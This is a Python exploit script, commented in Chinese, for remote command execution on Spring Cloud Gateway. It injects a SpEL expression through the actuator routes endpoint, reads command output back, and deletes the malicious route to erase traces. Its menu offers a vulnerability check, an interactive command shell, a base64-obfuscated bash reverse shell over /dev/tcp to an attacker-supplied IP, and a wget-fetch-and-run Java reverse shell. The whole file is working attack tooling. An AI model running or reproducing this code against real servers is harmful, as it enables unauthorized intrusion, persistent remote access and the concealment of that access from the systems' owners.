import base64
import time
import requests
import json
import re
import eventlet


def exec(url, pld, id):
    headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/json'
    }

    headers2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    payload = '''{\r
      "id": "hacktest",\r
      "filters": [{\r
        "name": "AddResponseHeader",\r
        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\'''' + pld + '''\').getInputStream()))}"}\r
        }],\r
      "uri": "http://127.0.0.1",\r
      "order": 0\r
    }'''
    # 添加恶意路由
    re1 = requests.post(url + "/actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json, verify=False)
    # 刷新配置
    start = time.time()
    eventlet.monkey_patch()  
    re3 = requests.get(url + "/actuator/gateway/routes", headers=headers2)
    try:
        with eventlet.Timeout(5, True):  # 设置超时时间为5秒
            re2 = requests.post(url + "/actuator/gateway/refresh", headers=headers2)
    # 访问恶意路由
        re3 = requests.get(url + "/actuator/gateway/routes/hacktest", headers=headers2)
    # 清理痕迹
        re4 = requests.delete(url + "/actuator/gateway/routes/hacktest", headers=headers2)
        re5 = requests.post(url + "/actuator/gateway/refresh", headers=headers2)
    except eventlet.timeout.Timeout:
    # 清理痕迹
        re4 = requests.delete(url + "/actuator/gateway/routes/hacktest", headers=headers2)
        re5 = requests.post(url + "/actuator/gateway/refresh", headers=headers2)
    #  一键检测漏洞
    if id == 1:
        if re1.status_code == 201:
            print("[+]创建恶意路由成功!")
        if re2.status_code == 200:
            print("[+]刷新恶意路由成功!")
        if re3.status_code == 200:
            str2 = ""  # 判断是否是容器
            user = re3.json()['filters'][0].split("'")[1].split("\n")[0]
            sm2 = re.findall("docker", re3.text)
            if len(sm2) >= 1:
                str2 = str(sm2[0])
            if str2  == "docker":
                print(f"[+]存在漏洞！！当前用户身份：{user}，检测到网站使用docker容器搭建\n")
            else:
                print(f"[+]存在漏洞！！当前用户身份：{user}")
        elif re1.status_code == 201 :
            print("[-]可能存在漏洞，自动化利用失败，请手动尝试！\n")
        else:
            print("[-]路由创建失败，不存在漏洞")
    # 命令执行回显
    elif id == 2:
        text = re3.json()['filters'][0].split("'")[1]
        print(">>"+text)
    elif id == 3:
        end = time.time()
        if int(end - start) <= 4:
            print("[-]反弹shell失败")
    elif id == 4: # 判断是否出网，默认访问百度
        if re3.status_code == 200:
            print("[+]目标出网！！可以尝试第5个功能")
        else:
            print("[-]目标出网失败！！"+re3.text)


def base64_Encode(pld):  # base64编码
    bytes_url = pld.encode("utf-8")
    str_url = base64.b64encode(bytes_url)  # 被编码的参数必须是二进制数据
    str_url = str(str_url)
    a = r"b\'(.+?)\'"
    sm = re.findall(a, str_url)
    return sm[0]


def payload(id):
    if id == 1:  # 编译反弹shell命令
        IP = input("[=]请输入接受反弹shell的IP：")
        port = input("[=]请输入接受反弹shell的端口：")
        pld = base64_Encode(f"bash -i >& /dev/tcp/{IP}/{port} 0>&1")
        return "bash -c {echo," + pld + "}|{base64,-d}|{bash,-i}"

    elif id == 2:  # 使用java代码反弹shell
        url = input("[=]请输入托管文件的地址：")
        pld = base64_Encode(f"wget {url} && java shell && rm -f shell.class")
        return "bash -c {echo," + pld + "}|{base64,-d}|{bash,-i}"
def CMD(pld):
    pld = base64_Encode(pld)
    return "bash -c {echo," + pld + "}|{base64,-d}|{bash,-i}"


if __name__ == "__main__":

    url = input("[=]检测目标：")
    url = url.rstrip('/')
    while True:
        print('''
            "1.一键检测目标是否存在漏洞"\r
            "2.命令执行"\r
            "3.使用/dev/tcp反弹shell"\r
            "4.检测目标是否出网"\r
            "5.使用java代码反弹shell"\r
            "6.更换测试网站"\r
            "0.退出"\r
            ''')
        num = int(input("选择功能："))
        pld = ""
        if num == 0:
            break
        if num == 1:
            pld = "bash -c {echo,d2hvYW1pICYmIGNhdCAvcHJvYy8xL2Nncm91cA==}|{base64,-d}|{bash,-i}"
        elif num == 2:
            print("[ ]输入'q'退出")
            while True:
                cmd = input("<<:")
                if cmd == "q":
                    break
                pld = CMD(cmd)
                exec(url, pld,num)
            continue
        elif num == 3:
            pld = payload(1)
        elif num == 4:
            pld = "curl www.baidu.com"
        elif num == 5:
            pld = payload(2)
        elif num == 6:
            url = input("[=]检测目标：")
            url = url.rstrip('/')
        exec(url, pld, num)
